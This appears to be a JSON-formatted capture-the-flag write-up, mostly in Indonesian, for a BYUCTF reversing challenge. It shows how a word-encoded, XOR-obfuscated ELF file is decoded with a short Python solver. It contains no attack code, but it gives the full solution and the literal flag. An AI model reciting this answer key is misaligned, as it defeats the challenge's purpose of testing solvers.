    "title": ": Pickle Rick - BYUCTF (Rev)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge : Pickle Rick - BYUCTF (Rev)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Saat membuka `pickled.txt`, isinya adalah deretan kata \"rick\" dan \"pickle\" yang berulang-ulang. Contoh:\n`rick rick rick pickle pickle rick rick rick ...`\n\nKarena total katanya adalah 68032 (kelipatan 8), diasumsikan bahwa setiap kata mewakili satu bit (0 atau 1).",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "Sebuah file bernama `pickled.txt` diberikan dengan deskripsi bahwa ini adalah binary ELF yang di-\"pickle\", tapi bukan menggunakan library pickle Python."
      },
      {
        "title": "Dekripsi",
        "content": "1. **Mapping Bit**: Melalui percobaan, ditemukan bahwa `rick` mewakili bit `0` dan `pickle` mewakili bit `1`.\n2. **Identifikasi Format**: Mengonversi 8 kata pertama menghasilkan byte `0x18`. Karena file ini seharusnya adalah ELF binary, byte pertamanya haruslah `0x7f`.\n3. **Mencari XOR Key**: Selisih antara `0x18` dan `0x7f` adalah `0x18 ^ 0x7f = 0x67`. Ternyata seluruh file di-XOR dengan key `0x67` (karakter 'g').\n4. **Rekonstruksi ELF**: Setelah bit dikonversi menjadi byte dan di-XOR dengan `0x67`, didapatkanlah file ELF 64-bit yang valid."
      },
      {
        "title": "Solve Script",
        "content": "Proses otomatisasi dapat dilihat di file `solve.py`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "def solve():\r\n    with open('pickled.txt', 'r') as f:\r\n        content = f.read().strip().split()\r\n    \r\n    # Map words to bits: rick=0, pickle=1\r\n    bits = ['1' if w == 'pickle' else '0' for w in content]\r\n    \r\n    # Group bits into bytes\r\n    bytes_val = []\r\n    for i in range(0, len(bits), 8):\r\n        byte_str = ''.join(bits[i:i+8])\r\n        bytes_val.append(int(byte_str, 2))\r\n        \r\n    # XOR with 0x67 to get the ELF\r\n    # We found this key by XORing the first byte (0x18) with 0x7f\r\n    decoded = bytes([b ^ 0x67 for b in bytes_val])\r\n    \r\n    with open('recovered_elf', 'wb') as f:\r\n        f.write(decoded)\r\n        \r\n    # The flag is in the data section of the ELF\r\n    # Or we can just run it if we are on Linux\r\n    import subprocess\r\n    import os\r\n    os.chmod('recovered_elf', 0o755)\r\n    result = subprocess.check_output(['./recovered_elf'])\r\n    print(result.decode().strip())\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{1m_p1ckl3_r1111ck!}",
    "lessonsLearned": ""
  }
];
